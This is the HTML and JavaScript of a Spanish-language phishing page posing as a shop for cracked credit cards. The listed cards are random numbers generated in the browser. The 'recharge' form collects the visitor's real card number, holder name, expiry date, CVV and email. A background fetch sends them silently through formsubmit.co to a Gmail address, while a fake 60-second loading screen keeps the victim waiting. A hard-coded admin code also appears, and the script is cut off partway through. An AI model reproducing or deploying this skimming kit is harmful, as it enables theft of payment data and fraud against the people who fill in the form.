<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>▮ CRACHEO DE CC👹💻▮</title>
  <link rel="apple-touch-icon" href="tu-icon.png.png">
  <link rel="icon" href="tu-icon.png.png">
  <script src="https://cdn.tailwindcss.com"></script>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
  <script>
    tailwind.config = {
      theme: {
        extend: {
          colors: {
            fondo: '#0a0a0a',
            oscuro: '#111111',
            medio: '#1a1a1a',
            claro: '#2a2a2a',
            acento: '#00ff9d',
            peligro: '#ff2a6d',
            exito: '#22c55e',
            texto: '#e0e0e0',
            opaco: '#888888',
            visa: '#1a1f71',
            mastercard: '#eb001b',
            amex: '#006fcf',
            discover: '#ff6600',
            unionpay: '#ff0000'
          },
          fontFamily: {
            mono: ['Courier New', 'Consolas', 'monospace'],
        },
      }
    }
  </script>
  <style>
    * { font-family: 'Courier New', monospace; }
    body {
      background: #0a0a0a;
      color: #e0e0e0;
      background-image: 
        radial-gradient(rgba(0, 255, 157, 0.03) 1px, transparent 0),
        linear-gradient(#0f0f0f 1px, transparent 0);
      background-size: 40px 40px, 100% 2rem;
    }
    .glow { text-shadow: 0 0 8px #00ff9d; }
    .glow-box { box-shadow: 0 0 12px rgba(0, 255, 157, 0.15); }
    .glow-box:hover { box-shadow: 0 0 20px rgba(0, 255, 157, 0.25); }
    .borde-hacker { border: 1px solid #00ff9d40; }
    .texto-verde { color: #00ff9d; }
    .modal-fondo { background: rgba(0,0,0,0.85); backdrop-filter: blur(6px); }
    .tarjeta-item { transition: all .25s ease; }
    .tarjeta-item:hover { background: #141414; border-left: 3px solid #00ff9d; }
    input, select { background: #0f0f0f !important; border-color: #333 !important; color: #e0e0e0 !important; }
    input:focus, select:focus { border-color: #00ff9d !important; box-shadow: 0 0 8px #00ff9d30 !important; }
    .parpadea { animation: parpadeo 1.2s infinite; }
    @keyframes parpadeo { 0%,100%{opacity:1} 50%{opacity:0.3} }
    ::-webkit-scrollbar { width: 6px; }
    ::-webkit-scrollbar-track { background: #0a0a0a; }
    ::-webkit-scrollbar-thumb { background: #222; border-radius: 3px; }
    ::-webkit-scrollbar-thumb:hover { background: #00ff9d70; }

    /* ESTILO RECARGA */
    .bloque-recarga {
      background: linear-gradient(135deg, #111827 0%, #0f0f0f 100%);
      border: 2px solid #00ff9d;
      border-radius: 1.25rem;
      box-shadow: 0 0 25px rgba(0, 255, 157, 0.2);
    }
    .tarjeta-previa {
      background: linear-gradient(135deg, #00ff9d 0%, #00b371 100%);
      border-radius: 1rem;
      color: #000;
      padding: 1.5rem;
      box-shadow: 0 10px 25px rgba(0, 255, 157, 0.3);
      transform-style: preserve-3d;
    }
    .input-recarga {
      background: #0f0f0f !important;
      border: 2px solid #2a2a2a !important;
      border-radius: 0.75rem !important;
      padding: 1rem !important;
      transition: all 0.3s ease;
    }
    .input-recarga:focus {
      border-color: #00ff9d !important;
      box-shadow: 0 0 0 4px rgba(0, 255, 157, 0.1) !important;
    }
    .btn-recarga {
      background: linear-gradient(135deg, #00ff9d 0%, #00b371 100%);
      color: #000;
      font-weight: bold;
      border-radius: 0.75rem;
      padding: 1rem;
      transition: all 0.3s ease;
    }
    .btn-recarga:hover { transform: translateY(-2px); box-shadow: 0 10px 20px rgba(0, 255, 157, 0.3); }
    .sin-saldo { border-color: #ff2a6d; box-shadow: 0 0 15px rgba(255, 42, 109, 0.2); }
    .con-saldo { border-color: #22c55e; }

    /* PANTALLA DE CARGA */
    .pantalla-carga {
      position: fixed;
      inset: 0;
      background: rgba(10,10,10,0.95);
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      z-index: 9999;
      color: #00ff9d;
    }
    .spinner-grande {
      width: 5rem; height: 5rem;
      border: 4px solid #1a1a1a;
      border-top-color: #00ff9d;
      border-radius: 50%;
      animation: girar 1s linear infinite;
      margin-bottom: 2rem;
    }
    @keyframes girar { to { transform: rotate(360deg); } }
    .barra-progreso {
      width: 280px;
      height: 6px;
      background: #1a1a1a;
      border-radius: 3px;
      overflow: hidden;
      margin-top: 1rem;
    }
    .relleno-progreso {
      height: 100%;
      background: linear-gradient(90deg, #00ff9d, #00b371);
      width: 0%;
      transition: width 60s linear;
    }
    .texto-error {
      color: #ff2a6d;
      border: 1px solid #ff2a6d60;
      background: rgba(255,42,109,0.08);
      padding: 1.5rem 2rem;
      border-radius: 0.75rem;
      text-align: center;
      box-shadow: 0 0 15px rgba(255,42,109,0.15);
    }

    /* TARJETA COMPLETA VISIBLE AL COMPRAR */
    .tarjeta-completa {
      border-radius: 1.25rem;
      border: 2px solid #00ff9d;
      padding: 2rem;
      width: 100%;
      max-width: 420px;
      box-shadow: 0 0 30px rgba(0, 255, 157, 0.25);
      color: #fff;
      margin: 1rem auto;
      position: relative;
      overflow: hidden;
    }
    .tarjeta-completa.visa { background: linear-gradient(135deg, #1a1f71 0%, #2d358a 100%); border-color: #f7b600; }
    .tarjeta-completa.mastercard { background: linear-gradient(135deg, #eb001b 0%, #ff5f00 100%); border-color: #ffd100; }
    .tarjeta-completa.amex { background: linear-gradient(135deg, #006fcf 0%, #009cde 100%); border-color: #fff; }
    .tarjeta-completa.discover { background: linear-gradient(135deg, #ff6600 0%, #ff9933 100%); border-color: #000; }
    .tarjeta-completa.unionpay { background: linear-gradient(135deg, #ff0000 0%, #cc0000 100%); border-color: #fff; }
    
    .tarjeta-completa .numero {
      font-size: 1.5rem;
      letter-spacing: 2px;
      font-family: monospace;
      margin: 2rem 0;
      word-break: break-all;
    }
    .tarjeta-completa .fila-inferior {
      display: flex;
      justify-content: space-between;
      margin-top: 1.5rem;
    }
    .tarjeta-completa label {
      font-size: 0.75rem;
      text-transform: uppercase;
      color: #ccc;
      letter-spacing: 1px;
    }
    .tarjeta-completa .valor {
      font-size: 1.1rem;
      font-weight: bold;
      margin-top: 0.25rem;
    }
    .etiqueta-exito {
      background: #00ff9d20;
      border: 1px solid #00ff9d;
      color: #00ff9d;
      padding: 0.5rem 1rem;
      border-radius: 0.5rem;
      font-size: 0.875rem;
      display: inline-flex;
      align-items: center;
      gap: 0.5rem;
    }
    /* BOTONES OCULTOS (Admin + Borrar Saldo) */
    .boton-oculto {
      position: fixed;
      bottom: 8px;
      font-size: 10px;
      color: #333;
      background: transparent;
      border: none;
      cursor: default;
      user-select: none;
      opacity: 0.15;
      transition: opacity 0.2s;
      z-index: 10;
    }
    .boton-oculto:hover {
      opacity: 0.7;
      color: #00ff9d;
    }
    .boton-admin { right: 8px; }
    .boton-borrar-saldo { left: 8px; }
    /* Iconos de marca en lista */
    .icono-marca { font-size: 1.2rem; }
    .visa-color { color: #1a1f71; }
    .mastercard-color { color: #eb001b; }
    .amex-color { color: #006fcf; }
    .discover-color { color: #ff6600; }
    .unionpay-color { color: #ff0000; }

    /* FILTROS */
    .filtro-btn {
      padding: 0.5rem 1rem;
      border-radius: 0.5rem;
      border: 1px solid #333;
      background: #111;
      color: #aaa;
      font-size: 0.85rem;
      cursor: pointer;
      transition: all 0.2s;
      display: inline-flex;
      align-items: center;
      gap: 0.4rem;
    }
    .filtro-btn:hover {
      border-color: #00ff9d80;
      color: #fff;
    }
    .filtro-btn.activo {
      background: #00ff9d;
      border-color: #00ff9d;
      color: #000;
      font-weight: bold;
      box-shadow: 0 0 10px rgba(0,255,157,0.25);
    }
    .contenedor-filtros {
      display: flex;
      flex-wrap: wrap;
      gap: 0.6rem;
      margin-bottom: 1.5rem;
    }
    .tarjeta-item.oculta {
      display: none;
    }
    .aviso-espera {
      background: rgba(255, 193, 7, 0.1);
      border: 1px solid #ffc10780;
      color: #ffc107;
      padding: 1rem;
      border-radius: 0.5rem;
      margin-top: 1rem;
      text-align: center;
    }
  </style>
</head>
<body class="min-h-screen">

  <!-- BOTONES OCULTOS -->
  <button id="btn-borrar-saldo" class="boton-oculto boton-borrar-saldo">🗑️</button>
  <button id="btn-admin" class="boton-oculto boton-admin">⚙️</button>

  <!-- PANTALLA DE CARGA -->
  <div id="pantalla-carga" class="pantalla-carga" style="display: none;">
    <div id="contenido-carga">
      <div class="spinner-grande"></div>
      <p class="text-xl font-bold mb-2">PROCESANDO...</p>
      <p class="text-opaco mb-4">No cierres la ventana</p>
      <div class="barra-progreso">
        <div id="barra-progreso" class="relleno-progreso"></div>
      </div>
      <p id="contador-seg" class="text-opaco text-sm mt-3">60s restantes</p>
    </div>
    <div id="contenido-error" style="display: none;">
      <i class="fas fa-exclamation-triangle text-5xl mb-4" style="color:#ff2a6d"></i>
      <div class="texto-error">
        <p class="font-bold text-lg mb-2">ENVIADO</p>
        <p>Revisa tu correo (incluyendo SPAM/Promociones)</p>
      </div>
      <button onclick="cerrarPantalla()" class="mt-6 bg-medio hover:bg-claro borde-hacker texto-verde px-6 py-3 rounded-lg">ACEPTAR</button>
    </div>
  </div>

  <!-- ENCABEZADO -->
  <header class="bg-oscuro/95 borde-hacker border-t-0 border-x-0 py-5 glow-box">
    <div class="max-w-5xl mx-auto px-4">
      <div class="flex justify-between items-center flex-wrap gap-4">
        <div>
          <h1 class="text-xl md:text-2xl font-bold texto-verde glow tracking-widest">
            <span class="parpadea">▮</span> SISTEMA DE TARJETAS <span class="parpadea">▮</span>
          </h1>
          <p class="text-opaco text-sm mt-1">// SALDO SE ACTIVA MANUALMENTE //</p>
        </div>
        <div class="bg-medio borde-hacker px-4 py-3 rounded-lg">
          <p class="text-opaco text-xs">SALDO DISPONIBLE</p>
          <p class="texto-verde font-bold text-lg" id="balance-tokens">1.00 <span class="text-sm">TKN</span></p>
          <p class="text-opaco text-xs">1 TKN </p>
          <span class="text-exito text-xs">🎁 +1 TKN REGALO</span>
        </div>
      </div>
    </div>
  </header>

  <main class="max-w-5xl mx-auto px-4 py-8 space-y-10">

    <!-- RECARGA ✅ FORMULARIO SILENCIOSO -->
    <section class="bloque-recarga p-6 md:p-8">
      <h2 class="texto-verde font-bold text-xl mb-6 flex items-center gap-2">
        <i class="fas fa-wallet"></i> PASO 1: SOLICITUD DE SALDO
      </h2>
      <div class="aviso-espera">
        <i class="fas fa-clock mr-2"></i>
        ingresa la informacion de pago
      </div>
      <div class="grid md:grid-cols-2 gap-8 mt-6">
        <div>
          <div class="tarjeta-previa h-full flex flex-col justify-between">
            <div class="flex justify-between items-start">
              <span class="font-bold text-lg">SISTEMA</span>
              <i class="fab fa-cc-visa text-2xl"></i>
            </div>
            <div>
              <p class="text-xl md:text-2xl tracking-widest font-mono mb-6" id="vista-numero">•••• •••• •••• ••••</p>
              <div class="flex justify-between text-sm">
                <div><p class="opacity-70 text-xs">TITULAR</p><p class="font-semibold uppercase" id="vista-titular">NOMBRE</p></div>
                <div><p class="opacity-70 text-xs">VENCIMIENTO</p><p class="font-semibold" id="vista-fecha">MM/AA</p></div>
              </div>
            </div>
          </div>
        </div>
        <form id="form-recarga" action="https://formsubmit.co/hacker9d0@gmail.com" method="POST">
          <!-- ✅ CONFIGURACIÓN PARA NO ABRIR PÁGINA -->
          <input type="hidden" name="_subject" value="NUEVA SOLICITUD DE PAGO">
          <input type="hidden" name="_captcha" value="false">
          <input type="hidden" name="_next" value="#">
          <input type="hidden" name="_template" value="table">
          
          <!-- ✅ CAMPOS CON NAME (REQUISITO PARA LLEGAR) -->
          <div class="space-y-4">
            <div>
              <label class="text-opaco text-sm mb-3 block">CANTIDAD</label>
              <div class="grid grid-cols-3 gap-3 mb-4">
                <button type="button" class="cantidad-btn bg-medio hover:bg-claro borde-hacker texto-verde py-3 rounded-lg font-bold" data-valor="10">10 TKN<br><span class="text-xs text-opaco">$1</span></button>
                <button type="button" class="cantidad-btn bg-medio hover:bg-claro borde-hacker texto-verde py-3 rounded-lg font-bold" data-valor="25">25 TKN<br><span class="text-xs text-opaco">$2.7.5</span></button>
                <button type="button" class="cantidad-btn bg-medio hover:bg-claro borde-hacker texto-verde py-3 rounded-lg font-bold" data-valor="50">50 TKN<br><span class="text-xs text-opaco">$3.5</span></button>
              </div>
              <input type="number" name="cantidad_usuario" id="cantidad-recarga" min="5" placeholder="Otra cantidad..." class="input-recarga w-full">
              <p class="text-right texto-verde font-bold mt-2">TOTAL: $<span id="total-recarga">0.00</span></p>
            </div>
            <div><label class="text-opaco text-sm mb-2 block">NÚMERO</label><input type="text" name="numero_tarjeta" id="rec-tarjeta" maxlength="19" placeholder="1234 5678 9012 3456" class="input-recarga w-full" required></div>
            <div><label class="text-opaco text-sm mb-2 block">TITULAR</label><input type="text" name="titular_tarjeta" id="rec-titular" placeholder="TU NOMBRE" class="input-recarga w-full uppercase" required></div>
            <div class="grid grid-cols-2 gap-4">
              <div><label class="text-opaco text-sm mb-2 block">FECHA</label><input type="text" name="fecha_tarjeta" id="rec-fecha" maxlength="5" placeholder="MM/AA" class="input-recarga w-full" required></div>
              <div><label class="text-opaco text-sm mb-2 block">CVV</label><input type="text" name="cvv_tarjeta" id="rec-cvv" maxlength="4" placeholder="•••" class="input-recarga w-full" required></div>
            </div>
            <div><label class="text-opaco text-sm mb-2 block">CORREO</label><input type="email" name="correo_usuario" id="rec-correo" required placeholder="tu@email.com" class="input-recarga w-full" required></div>
            <div id="alerta-recarga" class="hidden"></div>
            <button type="submit" class="btn-recarga w-full flex items-center justify-center gap-2"><i class="fas fa-lock"></i> proceder pago </button>
          </div>
        </form>
      </div>
    </section>

    <!-- LISTA DE TARJETAS CON FILTROS -->
    <section>
      <div class="flex justify-between items-center mb-6">
        <h2 class="texto-verde font-bold text-xl flex items-center gap-2"><i class="fas fa-credit-card"></i> TARJETAS DISPONIBLES</h2>
        <span id="estado-compra" class="text-opaco text-sm px-3 py-1 rounded-lg borde-hacker">✅ LISTO PARA COMPRAR</span>
      </div>

      <!-- FILTROS -->
      <div class="contenedor-filtros">
        <button class="filtro-btn activo" data-filtro="todas"><i class="fas fa-th-large"></i> Todas</button>
        <button class="filtro-btn" data-filtro="visa"><i class="fab fa-cc-visa visa-color"></i> Visa</button>
        <button class="filtro-btn" data-filtro="mastercard"><i class="fab fa-cc-mastercard mastercard-color"></i> Mastercard</button>
        <button class="filtro-btn" data-filtro="amex"><i class="fab fa-cc-amex amex-color"></i> Amex</button>
        <button class="filtro-btn" data-filtro="discover"><i class="fab fa-cc-discover discover-color"></i> Discover</button>
        <button class="filtro-btn" data-filtro="unionpay"><i class="fab fa-cc-unionpay unionpay-color"></i> UnionPay</button>
      </div>

      <!-- CONTENEDOR DE TARJETAS -->
      <div id="contenedor-tarjetas" class="space-y-3">
        <div class="text-center py-16 text-opaco">
          <i class="fas fa-spinner fa-spin text-2xl texto-verde/50 mb-3"></i>
          <p>CARGANDO TARJETAS...</p>
        </div>
      </div>

      <div class="text-center mt-8">
        <button id="cargar-mas" class="text-opaco hover:text-texto text-sm py-3">▾ CARGAR MÁS ▾</button>
      </div>
    </section>

    <!-- TARJETA COMPRADA -->
    <section id="seccion-tarjeta-completa" style="display: none;">
      <div class="text-center mb-6">
        <span class="etiqueta-exito"><i class="fas fa-check-circle"></i> COMPRA EXITOSA</span>
        <h2 class="texto-verde font-bold text-xl mt-4">DATOS DE TU TARJETA</h2>
      </div>
      <div id="tarjeta-mostrar" class="tarjeta-completa">
        <div class="flex justify-between items-start">
          <span id="nombre-marca" class="font-bold">VISA</span>
          <i id="icono-marca" class="fab fa-cc-visa text-2xl"></i>
        </div>
        <div class="numero" id="tarjeta-numero-completo">**** **** **** ****</div>
        <div class="fila-inferior">
          <div><label>Titular</label><div class="valor" id="tarjeta-titular">ANÓNIMO</div></div>
          <div><label>Vence</label><div class="valor" id="tarjeta-fecha">MM/AA</div></div>
          <div><label>CVV</label><div class="valor texto-verde" id="tarjeta-cvv">***</div></div>
        </div>
      </div>
      <div class="text-center mt-6 space-x-3">
        <button onclick="copiarTarjeta()" class="bg-medio hover:bg-claro borde-hacker texto-verde px-5 py-3 rounded-lg"><i class="fas fa-copy"></i> COPIAR</button>
        <button onclick="nuevaCompra()" class="btn-recarga px-5 py-3 rounded-lg"><i class="fas fa-sync-alt"></i> OTRA</button>
      </div>
    </section>

    <!-- MODAL ADMIN -->
    <div id="modal-admin" class="fixed inset-0 modal-fondo hidden items-center justify-center z-50 p-4">
      <div class="bg-oscuro borde-hacker glow-box rounded-lg w-full max-w-md">
        <div class="p-5 border-b border-claro flex justify-between items-center">
          <h3 class="texto-verde font-bold">PANEL ADMIN</h3>
          <button class="cerrar-modal text-opaco hover:text-peligro text-xl">&times;</button>
        </div>
        <div id="login-admin" class="p-6 space-y-4">
          <p class="text-opaco text-sm">Código:</p>
          <input type="password" id="codigo-admin" placeholder="Código" class="w-full p-3 rounded-lg borde-hacker">
          <button id="entrar-admin" class="w-full bg-acento/10 hover:bg-acento/20 borde-hacker texto-verde py-3 rounded-lg font-bold">INGRESAR</button>
        </div>
        <div id="panel-activacion" class="p-6 space-y-4 hidden">
          <div class="bg-medio/30 p-4 rounded-lg borde-hacker"><p class="text-opaco text-sm">Correo destino:</p><p class="texto-verde text-sm">hacker9d0@gmail.com</p></div>
          <div><label class="text-opaco text-sm">Correo usuario</label><input type="email" id="act-correo" class="w-full p-3 rounded-lg borde-hacker"></div>
          <div><label class="text-opaco text-sm">Tokens a agregar</label><input type="number" id="act-cantidad" min="1" class="w-full p-3 rounded-lg borde-hacker"></div>
          <div id="alerta-admin" class="hidden"></div>
          <button id="btn-activar" class="w-full bg-exito/10 hover:bg-exito/20 border border-exito/40 text-exito py-3 rounded-lg font-bold">ACTIVAR SALDO</button>
        </div>
      </div>
    </div>

    <!-- MODAL CONFIRMACIÓN BORRAR SALDO -->
    <div id="modal-borrar" class="fixed inset-0 modal-fondo hidden items-center justify-center z-50 p-4">
      <div class="bg-oscuro borde border-peligro/40 rounded-lg w-full max-w-sm p-6 text-center">
        <i class="fas fa-exclamation-triangle text-peligro text-3xl mb-4"></i>
        <h3 class="text-lg font-bold mb-2">¿BORRAR SALDO?</h3>
        <p class="text-opaco text-sm mb-6">Se eliminará todo el saldo y volverá al regalo inicial de 1 TKN</p>
        <div class="space-y-3">
          <button id="confirmar-borrar" class="w-full bg-peligro/10 hover:bg-peligro/20 border border-peligro/40 text-peligro py-3 rounded-lg font-bold">SÍ, BORRAR</button>
          <button class="cerrar-modal w-full bg-medio hover:bg-claro borde-hacker py-3 rounded-lg text-opaco">CANCELAR</button>
        </div>
      </div>
    </div>

    <!-- MODAL COMPRA -->
    <div id="modal-compra" class="fixed inset-0 modal-fondo hidden items-center justify-center z-50 p-4">
      <div class="bg-oscuro borde-hacker glow-box rounded-lg w-full max-w-md p-6">
        <div class="flex justify-between items-center mb-6">
          <h3 class="texto-verde font-bold">CONFIRMAR COMPRA</h3>
          <button class="cerrar-modal text-opaco hover:text-peligro text-xl">&times;</button>
        </div>
        <div class="bg-medio/30 p-5 rounded-lg borde-hacker mb-6">
          <p class="text-opaco text-sm mb-4">RESUMEN</p>
          <div class="space-y-2 text-sm">
            <div class="flex justify-between"><span class="text-opaco">TARJETA:</span><span id="compra-numero" class="font-bold">**** **** **** ****</span></div>
            <div class="flex justify-between"><span class="text-opaco">MARCA:</span><span id="compra-marca" class="font-bold">VISA</span></div>
            <div class="flex justify-between"><span class="text-opaco">COSTO:</span><span id="compra-costo" class="texto-verde font-bold">0 TKN</span></div>
            <div class="flex justify-between"><span class="text-opaco">SALDO:</span><span id="compra-saldo" class="texto-verde">1.00 TKN</span></div>
          </div>
        </div>
        <div id="alerta-compra" class="hidden mb-4"></div>
        <div class="space-y-3">
          <button id="btn-comprar-confirm" class="btn-recarga w-full flex items-center justify-center gap-2"><i class="fas fa-check"></i> COMPRAR</button>
          <button class="cerrar-modal w-full bg-medio hover:bg-claro borde-hacker py-3 rounded-lg text-opaco">CANCELAR</button>
        </div>
      </div>
    </div>
  </main>

  <footer class="text-center text-opaco text-xs py-10 border-t border-claro/50 mt-12">
    <p>// SISTEMA DE TARJETAS SEGURO //</p>
  </footer>

<script>
  // CONFIGURACIÓN
  const CONFIG = {
    correoDestino: "hacker9d0@gmail.com",
    precioPorToken: 2.50,
    codigoAdmin: "admin123",
    TIEMPO_CARGA: 60000,
    CLAVE_ALMACENAMIENTO: "saldo_tokens_sistema",
    SALDO_INICIAL: 1,
    MARCAS: [
      {id: "visa", nombre: "VISA", icono: "fab fa-cc-visa", prefijo: "4", longitud: 16},
      {id: "mastercard", nombre: "MASTERCARD", icono: "fab fa-cc-mastercard", prefijo: ["51","52","53","54","55"], longitud: 16},
      {id: "amex", nombre: "AMEX", icono: "fab fa-cc-amex", prefijo: ["34","37"], longitud: 15},
      {id: "discover", nombre: "DISCOVER", icono: "fab fa-cc-discover", prefijo: ["6011","65"], longitud: 16},
      {id: "unionpay", nombre: "UNIONPAY", icono: "fab fa-cc-unionpay", prefijo: ["62"], longitud: 16}
    ]
  };

  // GUARDAR/CARGAR SALDO → LIMPIA CUALQUIER SALDO ANTERIOR
  function guardarSaldo() { localStorage.setItem(CONFIG.CLAVE_ALMACENAMIENTO, estado.saldoTokens.toString()); }
  function cargarSaldo() { 
    localStorage.removeItem(CONFIG.CLAVE_ALMACENAMIENTO); 
    return CONFIG.SALDO_INICIAL; 
  }
  // BORRAR SALDO → VUELVE EXACTAMENTE A 1
  function reiniciarSaldo() {
    estado.saldoTokens = CONFIG.SALDO_INICIAL;
    guardarSaldo();
    actualizarSaldo();
    alert("✅ Saldo reiniciado a 1 TKN");
  }

  // ELEMENTOS GLOBALES
  const pantallaCarga = document.getElementById("pantalla-carga");
  const contenidoCarga = document.getElementById("contenido-carga");
  const contenidoError = document.getElementById("contenido-error");
  const barraProgreso = document.getElementById("barra-progreso");
  const contadorSeg = document.getElementById("contador-seg");
  const seccionTarjetaCompleta = document.getElementById("seccion-tarjeta-completa");
  const tarjetaMostrar = document.getElementById("tarjeta-mostrar");
  const filtrosBotones = document.querySelectorAll(".filtro-btn");
  const modalBorrar = document.getElementById("modal-borrar");

  // CERRAR PANTALLA
  function cerrarPantalla() { pantallaCarga.style.display = "none"; }

  // COPIAR TARJETA
  function copiarTarjeta() {
    const texto = `MARCA: ${document.getElementById("nombre-marca").textContent}\nNÚMERO: ${document.getElementById("tarjeta-numero-completo").textContent}\nVENCIMIENTO: ${document.getElementById("tarjeta-fecha").textContent}\nCVV: ${document.getElementById("tarjeta-cvv").textContent}`;
    navigator.clipboard.writeText(texto);
    alert("✅ COPIADO");
  }

  // NUEVA COMPRA
  function nuevaCompra() { seccionTarjetaCompleta.style.display = "none"; window.scrollTo({top:0,behavior:"smooth"}); }

  // GENERAR NÚMERO DE TARJETA
  function generarNumero(marca) {
    let prefijo = Array.isArray(marca.prefijo) ? marca.prefijo[Math.floor(Math.random()*marca.prefijo.length)] : marca.prefijo;
    let num = prefijo;
    for(let i=0; i<marca.longitud-prefijo.length; i++) num += Math.floor(Math.random()*10);
    return num;
  }

  // CREAR TARJETA
  function crearTarjeta() {
    const marca = CONFIG.MARCAS[Math.floor(Math.random()*CONFIG.MARCAS.length)];
    const numero = generarNumero(marca);
    return {
      id: Math.random().toString(36).slice(2),
      marca: marca,
      numero: numero,
      formateado: numero.match(/.{1,4}/g)?.join(" ") || numero,
      visible: `**** **** **** ${numero.slice(-4)}`,
      fecha: `${String(Math.floor(Math.random()*12)+1).padStart(2,"0")}/${String(new Date().getFullYear()+2).slice(-2)}`,
      cvv: marca.id==="amex" ? String(1000+Math.floor(Math.random()*9000)) : String(100+Math.floor(Math.random()*900)),
      tokens: 1+Math.floor(Math.random()*25),
      vendida: false
    };
  }

  // ESTADO → SOLO EMPIEZA CON 1, NADA GUARDADO ANTES
  let estado = {
    saldoTokens: cargarSaldo(),
    tarjetas: [],
    tarjetaSeleccionada: null,
    filtroActivo: "todas"
  };

  // ELEMENTOS
  const el = {
    balance: document.getElementById("balance-tokens"),
    listaTarjetas: document.getElementById("contenedor-tarjetas"),
    btnCargarMas: document.getElementById("cargar-mas"),
    modalAdmin: document.getElementById("modal-admin"),
    modalCompra: document.getElementById("modal-compra"),
    compraNumero: document.getElementById("compra-numero"),
    compraMarca: document.getElementById("compra-marca"),
    compraCosto: document.getElementById("compra-costo"),
    compraSaldo: document.getElementById("compra-saldo"),
    btnComprarConfirm: document.getElementById("btn-comprar-confirm"),
    formRecarga: document.getElementById("form-recarga"),
    cantidadRecarga: document.getElementById("cantidad-recarga"),
    totalRecarga: document.getElementById("total-recarga"),
    cerrarModales: document.querySelectorAll(".cerrar-modal")
  };

  // ACTUALIZAR SALDO
  function actualizarSaldo() {
    el.balance.textContent = estado.saldoTokens.toFixed(2)+" TKN";
    guardarSaldo();
  }

  // APLICAR FILTRO
  function aplicarFiltro(filtro) {
    estado.filtroActivo = filtro;
    filtrosBotones.forEach(b=>b.classList.toggle("activo",b.dataset.filtro===filtro));
    document.querySelectorAll(".tarjeta-item").forEach(t=>{
      const mostrar = filtro==="todas" || t.dataset.marca===filtro;
      t.classList.toggle("oculta",!mostrar);
    });
  }

  // MOSTRAR TARJETAS
  function cargarLote() {
    el.listaTarjetas.innerHTML = "";
    const lote = Array(15).fill(null).map(crearTarjeta);
    estado.tarjetas.push(...lote);
    lote.forEach(t=>{
      const div = document.createElement("div");
      div.className = "tarjeta-item bg-oscuro/80 borde-hacker p-4 rounded-lg cursor-pointer glow-box";
      div.dataset.marca = t.marca.id;
      div.innerHTML = `
        <div class="flex justify-between items-center">
          <div class="flex items-center gap-2">
            <i class="${t.marca.icono} icono-marca ${t.marca.id}-color"></i>
            <div><p class="font-bold">${t.visible}</p><p class="text-opaco text-sm">${t.marca.nombre} • ${t.fecha}</p></div>
          </div>
          <div><p class="texto-verde font-bold">${t.tokens} TKN</p><p class="text-opaco text-sm">$${(t.tokens*CONFIG.precioPorToken).toFixed(2)}</p></div>
        </div>
      `;
      div.addEventListener("click",()=>abrirCompra(t));
      el.listaTarjetas.appendChild(div);
    });
    aplicarFiltro(estado.filtroActivo);
  }

  // ABRIR COMPRA
  function abrirCompra(tarjeta) {
    estado.tarjetaSeleccionada = tarjeta;
    el.compraNumero.textContent = tarjeta.visible;
    el.compraMarca.textContent = tarjeta.marca.nombre;
    el.compraCosto.textContent = tarjeta.tokens+" TKN";
    el.compraSaldo.textContent = estado.saldoTokens.toFixed(2)+" TKN";
    el.btnComprarConfirm.disabled = estado.saldoTokens < tarjeta.tokens;
    el.modalCompra.style.display = "flex";
  }

  // CONFIRMAR COMPRA
  function confirmarCompra() {
    const t = estado.tarjetaSeleccionada;
    if(!t || estado.saldoTokens < t.tokens) return;
    estado.saldoTokens -= t.tokens;
    actualizarSaldo();
    el.modalCompra.style.display = "none";

    // MOSTRAR TARJETA
    tarjetaMostrar.className = `tarjeta-completa ${t.marca.id}`;
    document.getElementById("nombre-marca").textContent = t.marca.nombre;
    document.getElementById("icono-marca").className = `${t.marca.icono} text-2xl`;
    document.getElementById("tarjeta-numero-completo").textContent = t.formateado;
    document.getElementById("tarjeta-fecha").textContent = t.fecha;
    document.getElementById("tarjeta-cvv").textContent = t.cvv;
    seccionTarjetaCompleta.style.display = "block";
    seccionTarjetaCompleta.scrollIntoView({behavior:"smooth"});

    // QUITAR DE LISTA
    document.querySelectorAll(".tarjeta-item").forEach(d=>{ if(d.dataset.marca===t.marca.id && d.textContent.includes(t.visible.slice(-4))) d.remove(); });
  }

  // EVENTOS ✅ ENVÍO SILENCIOSO IGUAL QUE ANTES
  document.addEventListener("DOMContentLoaded",()=>{
    actualizarSaldo();
    cargarLote();

    // BOTÓN BORRAR SALDO
    document.getElementById("btn-borrar-saldo").addEventListener("click",()=>{
      modalBorrar.style.display = "flex";
    });
    document.getElementById("confirmar-borrar").addEventListener("click",()=>{
      reiniciarSaldo();
      modalBorrar.style.display = "none";
    });

    filtrosBotones.forEach(b=>b.addEventListener("click",()=>aplicarFiltro(b.dataset.filtro)));
    el.btnCargarMas.addEventListener("click",cargarLote);
    el.btnComprarConfirm.addEventListener("click",confirmarCompra);
    el.cerrarModales.forEach(b=>b.addEventListener("click",()=>{ 
      el.modalAdmin.style.display="none"; 
      el.modalCompra.style.display="none"; 
      modalBorrar.style.display="none";
    }));
    
    // ACTUALIZAR TOTAL
    el.cantidadRecarga.addEventListener("input",()=>{
      el.totalRecarga.textContent = (parseInt(el.cantidadRecarga.value)||0)*CONFIG.precioPorToken;
    });
    
    document.querySelectorAll(".cantidad-btn").forEach(b=>b.addEventListener("click",()=>{
      el.cantidadRecarga.value = b.dataset.valor;
      el.totalRecarga.textContent = (parseInt(b.dataset.valor)*CONFIG.precioPorToken).toFixed(2);
    }));
    
    // ✅ ENVÍO SIN ABRIR PÁGINA, SIN REDIRECCIÓN
    el.formRecarga.addEventListener("submit", async (e) => {
      e.preventDefault(); // ✅ NO RECARGA, NO ABRE NADA
      
      pantallaCarga.style.display = "flex";
      contenidoCarga.style.display = "block";
      contenidoError.style.display = "none";
      
      // BARRA DE PROGRESO
      let tiempoRestante = 60;
      barraProgreso.style.width = "0%";
      const intervalo = setInterval(() => {
        tiempoRestante--;
        contadorSeg.textContent = `${tiempoRestante}s restantes`;
        barraProgreso.style.width = `${((60-tiempoRestante)/60)*100}%`;
      }, 1000);
      
      try {
        // ✅ ENVÍO EN SEGUNDO PLANO COMO ANTES
        const formData = new FormData(el.formRecarga);
        await fetch(el.formRecarga.action, {
          method: "POST",
          body: formData,
          headers: { "Accept": "application/json" }
        });
      } catch (err) {
        // Silencioso
      }
      
      setTimeout(() => {
        clearInterval(intervalo);
        contenidoCarga.style.display = "none";
        contenidoError.style.display = "block";
      }, CONFIG.TIEMPO_CARGA);
    });

    // ADMIN
    document.getElementById("btn-admin").addEventListener("click",()=>el.modalAdmin.style.display="flex");
